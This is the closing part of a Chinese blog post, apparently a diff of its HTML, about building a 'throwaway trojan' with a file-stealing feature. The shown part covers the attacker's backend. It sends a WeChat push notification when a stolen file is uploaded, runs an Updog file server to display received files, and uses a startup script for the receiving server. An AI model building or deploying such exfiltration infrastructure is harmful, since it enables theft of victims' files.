+<li><p>登入：用GitHub账号<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=github&a=login">登入网站</a>，就能获得一个<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=code">SCKEY</a>（在「<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=code">发送消息</a>」页面）</p>
+</li>
+<li><p>绑定：点击「<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=wechat&a=bind">微信推送</a>」，扫码关注同时即可完成绑定</p>
+</li>
+<li><p>发消息：往</p>
+<p><a target="_blank" rel="noopener" href="http://sc.ftqq.com/SCKEY.send">http://sc.ftqq.com/SCKEY.send</a></p>
+<p>发GET请求，就可以在微信里收到消息啦</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;https://sc.ftqq.com/SCUxxxxxxxxxxx5f04129c5dc9a.send&quot;</span><br><span class="line">d = &#123;&#x27;text&#x27;: &#x27;文件上传成功&#x27;, &#x27;desp&#x27;: time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) + &quot;\n\n文件名:&#123;&#125;\n\n请登录后台查看~&quot;.format(filename)&#125;</span><br><span class="line">requests.post(url, data=d)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="文件展示"><a href="#文件展示" class="headerlink" title="文件展示"></a>文件展示</h3><p>Updog是Python的替代品<code>SimpleHTTPServer</code>。它允许通过HTTP &#x2F; S进行上传和下载，可以设置临时SSL证书并使用HTTP基本身份验证。<br>example：python3 updog -d &#x2F;opt&#x2F;rh&#x2F; –password directory<br>使用HTTP基本身份验证。要登录，将用户名留空，然后在“密码”字段中输入密码<br><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/_20201113113234.png" alt="_20201113113234.png"></p>
+<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">python /opt/http_server.py 80 /opt/rh &amp;</span><br><span class="line">python3 /opt/updog -d /opt/rh/ --password directory &amp;</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>
+
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xxxxd.gif" alt="xxxxd.gif"></p>
+<p>思路和主要代码都给出来了，自动动动手就写出来了~如果有意向可以一起交流。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/life/">漂泊</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8D%95%E5%8A%9F%E8%83%BD%E7%89%88"><span class="toc-number">2.</span> <span class="toc-text">一、单功能版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%B9%E8%BF%9B%E7%89%88"><span class="toc-number">3.</span> <span class="toc-text">二、改进版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">窃取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E6%94%B6%E6%96%87%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">接收文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%91%E6%8E%A7"><span class="toc-number">6.</span> <span class="toc-text">数据监控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%B1%95%E7%A4%BA"><span class="toc-number">7.</span> <span class="toc-text">文件展示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA"><span class="toc-number">9.</span> <span class="toc-text">演示</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&text=炮灰马之文件窃取功能"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&is_video=false&description=炮灰马之文件窃取功能"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=炮灰马之文件窃取功能&body=Check out this article: https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&name=炮灰马之文件窃取功能&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&t=炮灰马之文件窃取功能"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
